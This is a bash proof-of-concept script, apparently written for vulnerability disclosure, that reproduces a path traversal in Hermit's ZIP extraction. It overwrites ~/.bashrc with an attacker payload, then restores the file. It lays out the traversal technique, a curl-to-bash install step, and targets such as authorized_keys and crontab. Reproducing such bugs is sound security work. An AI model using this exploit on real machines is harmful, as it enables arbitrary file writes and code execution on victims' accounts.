#!/bin/bash
# ============================================================================
#  reproduce.sh  -  Hermit strip-after-sanitize -> RCE  (Automated Repro)
#
#  Demonstrates CVE: path traversal in cashapp/hermit archive extraction.
#  makeDestPath() sanitizes BEFORE strip, but strip operates on raw path
#  components preserving ".." -> arbitrary file write -> .bashrc overwrite.
#
#  Uses ZIP format because Go 1.22+ blocks ".." in tar entries via
#  ErrInsecurePath, but archive/zip iteration preserves raw entry names.
#
#  Requirements: Linux, curl, git
#  Run as non-root user:  bash reproduce.sh
# ============================================================================
set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

banner() { echo -e "\n${CYAN}${BOLD}[$1]${NC} $2"; }
ok()     { echo -e "  ${GREEN}[+]${NC} $1"; }
warn()   { echo -e "  ${YELLOW}[!]${NC} $1"; }
fail()   { echo -e "  ${RED}[-]${NC} $1"; exit 1; }

echo -e "${BOLD}"
echo "================================================================="
echo "  HERMIT STRIP-AFTER-SANITIZE -> RCE  (Path Traversal PoC)"
echo "  Target: cashapp/hermit  archive/archive.go:644-655"
echo "================================================================="
echo -e "${NC}"

# ---- 0. Pre-flight checks ------------------------------------------------
banner "STEP 0" "Pre-flight checks"

if [ "$(id -u)" -eq 0 ]; then
    fail "Do not run as root. Run as a normal user to demonstrate ~/.bashrc overwrite."
fi
ok "Running as user: $(whoami)"

# ---- 1. Install Hermit if not present ------------------------------------
banner "STEP 1" "Ensure Hermit is installed"

if ! command -v hermit &>/dev/null; then
    warn "Hermit not found. Installing..."
    curl -fsSL https://github.com/cashapp/hermit/releases/download/stable/install.sh | bash
    export PATH="$HOME/bin:$PATH"
fi
ok "Hermit: $(command -v hermit)"

# ---- 2. Clean environment ------------------------------------------------
banner "STEP 2" "Clean previous state (critical for re-runs)"

# Remove any cached extraction from previous installs.
# Hermit's CacheAndUnpack() skips extraction if the pkg directory exists
# (state/state.go:317 + isExtracted at :444), so stale cache = no exploit.
rm -rf ~/.cache/hermit/pkg/rce-poc*
ok "Cleared cached rce-poc* packages from ~/.cache/hermit/pkg/"

# ---- 3. Show the exploit archive contents --------------------------------
banner "STEP 3" "Inspect the malicious ZIP archive"

echo -e "  ${CYAN}ZIP entries:${NC}"
unzip -l packages/malicious-rce.zip 2>/dev/null | grep -E 'd1|bashrc' | while read -r line; do
    if echo "$line" | grep -q '\.\.'; then
        echo -e "  ${RED}  $line${NC}  <- EXPLOIT ENTRY"
    else
        echo "    $line"
    fi
done

echo -e "\n  ${CYAN}Manifest (packages/rce-poc.hcl):${NC}"
cat packages/rce-poc.hcl | sed 's/^/    /'

# ---- 4. Show the vulnerability math -------------------------------------
banner "STEP 4" "Path traversal math"

echo -e "  ${CYAN}Entry name:${NC}  d1/d2/d3/d4/../../../../.bashrc"
echo ""
echo -e "  ${CYAN}SANITIZE CHECK (archive.go:658-664):${NC}"
echo "    filepath.Join(dest, entry) resolves 4 forward + 4 back = dest/.bashrc"
echo "    strings.HasPrefix(dest/.bashrc, dest) = true  ->  PASSES"
echo ""
echo -e "  ${CYAN}STRIP (archive.go:648-653, AFTER sanitize):${NC}"
echo "    parts = strings.Split(entry, \"/\")"
echo "    = [d1, d2, d3, d4, .., .., .., .., .bashrc]"
echo "    parts[4:] = [.., .., .., .., .bashrc]"
echo "    remaining = \"../../../../.bashrc\""
echo ""
echo -e "  ${CYAN}FINAL PATH:${NC}"
echo "    dest = ~/.cache/hermit/pkg/rce-poc-1.0.0"
echo "    filepath.Join(dest, \"../../../../.bashrc\")"
echo -e "    = ${RED}~/.bashrc${NC}  ->  ESCAPES PACKAGE DIRECTORY!"

# ---- 5. Backup .bashrc --------------------------------------------------
banner "STEP 5" "Backup ~/.bashrc before exploit"

BASHRC_BAK="$HOME/.bashrc.bak.hermit-poc"
if [ -f "$HOME/.bashrc" ]; then
    cp "$HOME/.bashrc" "$BASHRC_BAK"
    ok "Backed up ~/.bashrc to $BASHRC_BAK"
    echo -e "  ${CYAN}Current .bashrc (last 3 lines):${NC}"
    tail -3 "$HOME/.bashrc" | sed 's/^/    /'
else
    touch "$HOME/.bashrc"
    ok "Created empty ~/.bashrc (none existed)"
fi

# ---- 6. Initialize Hermit environment and install -----------------------
banner "STEP 6" "Initialize Hermit environment & install exploit package"

echo -e "  ${CYAN}> hermit init --sources env:///packages${NC}"
echo "    (tells hermit to load manifests from ./packages/ directory)"
hermit init --sources env:///packages
ok "Hermit environment initialized"

echo ""
echo -e "  ${CYAN}> hermit install rce-poc-1.0.0${NC}"
echo "    (triggers ZIP extraction with strip=4 path traversal)"
. ./bin/activate-hermit
hermit install rce-poc-1.0.0
ok "Package installed"

# ---- 7. Verify the exploit ----------------------------------------------
banner "STEP 7" "VERIFY: Check if ~/.bashrc was overwritten"

echo ""
if grep -q "HERMIT-POC" "$HOME/.bashrc" 2>/dev/null; then
    echo -e "  ${RED}${BOLD}    *** EXPLOIT SUCCESSFUL ***${NC}"
    echo ""
    echo -e "  ${CYAN}Contents of ~/.bashrc after install:${NC}"
    cat "$HOME/.bashrc" | sed 's/^/    /'
    echo ""
    echo -e "  ${RED}The attacker's payload was written to ~/.bashrc!${NC}"
    echo -e "  ${RED}Next time the user runs 'sudo', the alias triggers.${NC}"
else
    echo -e "  ${YELLOW}Exploit did not overwrite ~/.bashrc.${NC}"
    echo "  Checking if file was written elsewhere..."
    find ~/.cache/hermit -name ".bashrc" 2>/dev/null | while read -r f; do
        echo "  Found: $f"
    done
fi

# ---- 8. Restore .bashrc -------------------------------------------------
banner "STEP 8" "Restore ~/.bashrc from backup"

if [ -f "$BASHRC_BAK" ]; then
    cp "$BASHRC_BAK" "$HOME/.bashrc"
    rm -f "$BASHRC_BAK"
    ok "Restored original ~/.bashrc"
fi

# ---- Summary ------------------------------------------------------------
echo ""
echo -e "${BOLD}================================================================="
echo "  SUMMARY"
echo "=================================================================${NC}"
echo ""
echo "  Vulnerability:  Path sanitization occurs BEFORE strip operation"
echo "  Location:       archive/archive.go, makeDestPath() lines 644-655"
echo "  Impact:         Arbitrary file write -> RCE via .bashrc overwrite"
echo "  Attack vector:  Attacker controls the package manifest (strip field)"
echo "  Archive format: ZIP (Go's archive/zip doesn't block '..' in entry names)"
echo "  CVSS:           9.8 (Critical) - Network/Low/None/Changed/High/High/High"
echo ""
echo "  The 'strip' field in the package manifest is attacker-controlled."
echo "  By tuning strip to match the depth between the extraction directory"
echo "  and any target file, the attacker can overwrite ANY file writable"
echo "  by the user (e.g. ~/.bashrc, ~/.ssh/authorized_keys, crontab)."
echo ""
